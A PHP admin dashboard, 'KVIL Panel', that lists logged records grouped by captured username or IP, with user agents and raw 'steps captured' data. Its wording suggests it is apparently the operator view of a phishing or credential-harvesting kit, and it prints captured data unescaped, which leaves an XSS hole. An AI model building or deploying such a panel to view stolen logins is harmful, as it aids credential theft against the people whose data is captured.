<?php
session_start();
if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
    header("Location: login.php");
    exit;
}

require_once('../db.php');

// Logout logic
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: login.php");
    exit;
}

// Fetch Logs
$logs = [];
if ($pdo) {
    $stmt = $pdo->query("SELECT * FROM logs ORDER BY updated_at DESC");
    $allLogs = $stmt->fetchAll();

    // Grouping by Email (Username) -> fallback to IP
    foreach ($allLogs as $log) {
        $details = json_decode($log['details'], true) ?: [];
        $key = isset($details['username']) ? $details['username'] : 'IP: ' . $log['ip_address'];

        if (!isset($logs[$key])) {
            $logs[$key] = [
                'latest_updated' => $log['updated_at'],
                'ip' => $log['ip_address'],
                'user_agent' => $log['user_agent'],
                'entries' => []
            ];
        }
        $log['data'] = $details;
        $logs[$key]['entries'][] = $log;
    }
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard - KVIL Panel</title>
    <link rel="stylesheet" href="style.css">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet" />
</head>

<body>
    <div class="sidebar">
        <div class="logo">KVIL Panel</div>
        <a href="#" class="active"><i class="fas fa-tachometer-alt"></i> Dashboard <span class="badge">
                <?php echo count($logs); ?>
            </span></a>
        <a href="?logout=true" class="logout">Logout</a>
    </div>

    <div class="content">
        <h1>Active Sessions (Grouped)</h1>

        <?php if (empty($logs)): ?>
            <div class="no-data">No active sessions found.</div>
        <?php else: ?>
            <?php foreach ($logs as $identifier => $group): ?>
                <div class="session-card">
                    <div class="session-header" onclick="this.nextElementSibling.classList.toggle('hidden')">
                        <div class="session-title">
                            <h3>
                                <?php echo htmlspecialchars($identifier); ?>
                            </h3>
                            <span class="timestamp">Last Activity:
                                <?php echo $group['latest_updated']; ?>
                            </span>
                        </div>
                        <div class="session-meta">
                            <span>
                                <?php echo count($group['entries']); ?> steps captured
                            </span>
                            <i class="fas fa-chevron-down"></i>
                        </div>
                    </div>
                    <div class="session-details hidden">
                        <p><strong>IP:</strong>
                            <?php echo htmlspecialchars($group['ip']); ?>
                        </p>
                        <p><strong>UA:</strong>
                            <?php echo htmlspecialchars($group['user_agent']); ?>
                        </p>
                        <div class="log-entries">
                            <?php foreach ($group['entries'] as $entry): ?>
                                <div class="entry">
                                    <span class="entry-time">
                                        <?php echo $entry['created_at']; ?>
                                    </span>
                                    <pre><?php print_r($entry['data']); ?></pre>
                                </div>
                            <?php endforeach; ?>
                        </div>
                    </div>
                </div>
            <?php endforeach; ?>
        <?php endif; ?>
    </div>
</body>

</html>